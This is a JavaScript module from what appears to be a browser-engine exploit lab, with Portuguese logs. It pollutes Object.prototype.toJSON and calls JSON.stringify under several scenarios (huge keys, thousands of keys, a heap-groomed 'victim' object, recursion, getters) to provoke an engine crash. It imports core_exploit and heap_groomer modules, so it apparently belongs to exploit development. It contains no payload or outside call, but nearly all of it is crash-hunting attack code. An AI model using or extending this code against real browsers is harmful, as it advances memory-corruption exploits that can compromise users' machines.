// js/json_exploit_test.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';

const FNAME_BASE = "JsonExploitTest";

let toJsonRecursionCounter = 0;
const MAX_TO_JSON_RECURSION = 5;

export async function attemptJsonStringifyCrash(objectToSerialize, chosenScenario = 'fallback') {
    appLog(`--- Iniciando ${FNAME_BASE}.attemptJsonStringifyCrash (Cenário: ${chosenScenario}) ---`, 'test', FNAME_BASE);
    toJsonRecursionCounter = 0;

    const ppKey = 'toJSON';
    let originalToJSON_Descriptor;
    let ppAppliedSuccessfully = false;
    let crashObserved = false;

    const currentTestObject = objectToSerialize || {
        data_default_json_module: "default_val",
    };
    appLog(`   Objeto a ser serializado (chaves): ${Object.keys(currentTestObject).join(', ')}`, 'info', FNAME_BASE);


    try {
        originalToJSON_Descriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        Object.prototype[ppKey] = function() {
            appLog(`===> Poluição Object.prototype.toJSON ATIVADA (Chamada ${++toJsonRecursionCounter}, Cenário: ${chosenScenario}) <===`, 'vuln', FNAME_BASE);
            appLog(`   toJSON - typeof this: ${typeof this}`, 'info', FNAME_BASE);
            if (this !== null && typeof this === 'object') {
                appLog(`   toJSON - this.constructor.name: ${this.constructor ? this.constructor.name : 'N/A'}`, 'info', FNAME_BASE);
            }


            switch (chosenScenario) {
                case 'scenario0_poc_v21': // Novo cenário para replicar o PoC Isolado v2.1
                    appLog(`   toJSON - Executando Cenário 0: Replicar PoC Isolado v2.1`, 'tool', FNAME_BASE);
                    try {
                        // Este é o retorno exato do PoC Isolado v2.1 que causava o crash
                        const keysOfThis = Object.keys(this);
                        appLog(`   toJSON (S0 - PoC v2.1) - Chaves de 'this': [${keysOfThis.join(', ')}]`, 'info', FNAME_BASE);
                        return {
                            original_data_keys: keysOfThis,
                            polluted_toJSON: true
                        };
                    } catch (e) {
                        appLog(`   toJSON (S0 - PoC v2.1) - Erro ao obter Object.keys(this): ${e.message}`, 'error', FNAME_BASE);
                        return { "error_scenario0_poc_v21_getting_keys": true, "message": String(e.message), "this_type": String(typeof this) };
                    }


                case 'scenario1': // String/Chave Longa
                    appLog(`   toJSON - Executando Cenário 1: String/Chave Longa`, 'tool', FNAME_BASE);
                    try {
                        const keyLength = 60;
                        const valueLength = 1024 * 20;
                        let largeObject = {};
                        const keyName = "K".repeat(keyLength);
                        const keyValue = "V".repeat(valueLength);
                        appLog(`   toJSON (S1) - Retornando objeto com chave de tam ${keyName.length} e valor de tam ${keyValue.length}`, 'info', FNAME_BASE);
                        largeObject[keyName] = keyValue;
                        return largeObject;
                    } catch(e) {
                        appLog(`   toJSON (S1) - Erro: ${e.message}`, 'error', FNAME_BASE);
                        return {"error_scenario1": true, "message": String(e.message)};
                    }

                case 'scenario2': // Muitas Chaves
                    appLog(`   toJSON - Executando Cenário 2: Muitas Chaves`, 'tool', FNAME_BASE);
                    try {
                        let manyKeysObject = {};
                        const numberOfKeys = 5000;
                        appLog(`   toJSON (S2) - Retornando objeto com ${numberOfKeys} chaves.`, 'info', FNAME_BASE);
                        for(let i=0; i < numberOfKeys; i++) {
                            manyKeysObject["key_" + i] = "val_" + i;
                        }
                        return manyKeysObject;
                    } catch(e) {
                        appLog(`   toJSON (S2) - Erro: ${e.message}`, 'error', FNAME_BASE);
                        return {"error_scenario2": true, "message": String(e.message)};
                    }

                case 'scenario3': // 'this' é Vítima
                    appLog(`   toJSON - Executando Cenário 3: 'this' é Vítima`, 'tool', FNAME_BASE);
                    if (Groomer.victim_object && this === Groomer.victim_object) {
                        appLog("   toJSON (S3) - 'this' É O OBJETO VÍTIMA!", "vuln", FNAME_BASE);
                        let victimData = { isVictimScenario: true, length_seen: 0, elem0_seen: null, error_msg: null };
                        try {
                            victimData.length_seen = this.length;
                            victimData.elem0_seen = this[0];
                        } catch (e) {
                            appLog(`   toJSON (S3) - Erro ao acessar props da vítima: ${e.message}`, 'error', FNAME_BASE);
                            victimData.error_msg = String(e.message);
                        }
                        return victimData;
                    } else {
                        appLog("   toJSON (S3) - 'this' não é o objeto vítima esperado, ou vítima não preparada. Usando fallback.", 'warn', FNAME_BASE);
                        return { "toJSON_executed_scenario3_but_not_victim": true, "this_type": String(typeof this) };
                    }

                case 'scenario4': // Recursão Controlada
                    appLog(`   toJSON - Executando Cenário 4: Recursão Controlada`, 'tool', FNAME_BASE);
                    if (toJsonRecursionCounter < MAX_TO_JSON_RECURSION) {
                        appLog(`   toJSON (S4) - Recursão, contador: ${toJsonRecursionCounter}`, 'info', FNAME_BASE);
                        return { "recursive_call_scenario4": this };
                    } else {
                        appLog(`   toJSON (S4) - Máximo de recursões.`, 'warn', FNAME_BASE);
                        return { "max_recursion_reached_scenario4": true };
                    }

                case 'scenario5': // Getter Problemático
                    appLog(`   toJSON - Executando Cenário 5: Getter Problemático`, 'tool', FNAME_BASE);
                    return {
                        get triggerExploitLogicScenario5() {
                            appLog("   toJSON (S5) - Getter 'triggerExploitLogicScenario5' ACESSADO!", "vuln", FNAME_BASE);
                            return "getter_s5_executado";
                        }
                    };

                case 'fallback':
                default: 
                    appLog(`   toJSON - Executando Cenário: Fallback/Padrão`, 'tool', FNAME_BASE);
                    let keysInfo = "N/A";
                    if (this !== null && typeof this === 'object') {
                        try { keysInfo = `Contagem: ${Object.keys(this).length}. Amostra: ${Object.keys(this).slice(0,5).join(', ')}`; }
                        catch (e) { keysInfo = `Erro chaves: ${e.message}`; }
                    }
                    return { "toJSON_executed_fallback": true, "this_type_fallback": String(typeof this), "keys_info_fallback": keysInfo };
            }
        };
        ppAppliedSuccessfully = true;
        appLog(`Poluição Object.prototype.${ppKey} aplicada (Cenário: ${chosenScenario}).`, 'good', FNAME_BASE);
        appLog(`Tentando JSON.stringify... (Pode travar aqui)`, 'critical', FNAME_BASE);

        await PAUSE_LAB(150);

        const result = JSON.stringify(currentTestObject, null, 2);

        appLog(`JSON.stringify CONCLUÍDO SEM CRASH VISÍVEL (Cenário: ${chosenScenario}).`, 'warn', FNAME_BASE);
        if (result) {
            appLog(`   Resultado (primeiros 500 chars): ${String(result).substring(0, 500)}...`, 'info', FNAME_BASE);
        } else {
            appLog("   INFO: JSON.stringify retornou resultado vazio/nulo.", 'warn', FNAME_BASE);
        }

    } catch (e) {
        appLog(`CRASH/ERRO CAPTURADO (Cenário: ${chosenScenario}): ${e.name} - ${e.message}`, 'vuln', FNAME_BASE);
        if (e.stack) { appLog(`   Stack: ${e.stack}`, 'error', FNAME_BASE); }
        console.error(`JSON.stringify Crash (Cenário: ${chosenScenario}):`, e);
        appLog("CRASH OBSERVADO! Verifique console/debugger.", 'critical', FNAME_BASE);
        crashObserved = true;
    } finally {
        if (ppAppliedSuccessfully) {
            if (originalToJSON_Descriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor);
            } else { delete Object.prototype[ppKey]; }
            appLog(`Object.prototype.${ppKey} restaurado.`, 'good', `${FNAME_BASE}.Cleanup`);
        }
    }

    appLog(`--- ${FNAME_BASE}.attemptJsonStringifyCrash (Cenário: ${chosenScenario}) Concluído (Crash: ${crashObserved}) ---`, 'test', FNAME_BASE);
    if (crashObserved) {
        appLog("*********************************************************************", "vuln", FNAME_BASE);
        appLog(`****** CRASH (Cenário: ${chosenScenario}) JSON.STRINGIFY! ******`, "vuln", FNAME_BASE);
        appLog("*********************************************************************", "vuln", FNAME_BASE);
    }
    return crashObserved;
}
